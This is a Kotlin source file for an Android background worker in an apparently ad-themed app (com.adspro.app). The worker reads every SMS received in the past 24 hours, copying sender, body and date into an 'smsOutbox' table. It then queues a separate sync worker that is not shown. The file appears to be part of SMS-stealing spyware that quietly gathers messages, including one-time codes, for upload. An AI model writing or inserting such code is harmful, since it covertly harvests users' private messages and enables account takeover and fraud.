package com.adspro.app.worker

import android.content.Context
import android.net.Uri
import android.provider.Telephony
import androidx.work.*
import com.adspro.app.data.*

class CatchupScanWorker(context: Context, params: WorkerParameters) : CoroutineWorker(context, params) {
    override suspend fun doWork(): Result {
        val cursor = applicationContext.contentResolver.query(
            Uri.parse("content://sms/inbox"),
            arrayOf(Telephony.Sms.ADDRESS, Telephony.Sms.BODY, Telephony.Sms.DATE),
            "${Telephony.Sms.DATE} > ?",
            arrayOf((System.currentTimeMillis() - 24 * 60 * 60 * 1000).toString()),
            "${Telephony.Sms.DATE} ASC"
        )
        cursor?.use {
            val db = AppDatabase.getDatabase(applicationContext)
            val addressIndex = it.getColumnIndex(Telephony.Sms.ADDRESS)
            val bodyIndex = it.getColumnIndex(Telephony.Sms.BODY)
            val dateIndex = it.getColumnIndex(Telephony.Sms.DATE)
            while (it.moveToNext()) {
                db.smsOutboxDao().insert(SmsOutbox(
                    sender = if (addressIndex != -1) it.getString(addressIndex) else "Unknown",
                    body = if (bodyIndex != -1) it.getString(bodyIndex) else "",
                    timestamp = if (dateIndex != -1) it.getLong(dateIndex) else System.currentTimeMillis()
                ))
            }
        }
        WorkManager.getInstance(applicationContext).enqueue(OneTimeWorkRequestBuilder<SmsSyncWorker>().build())
        return Result.success()
    }
}
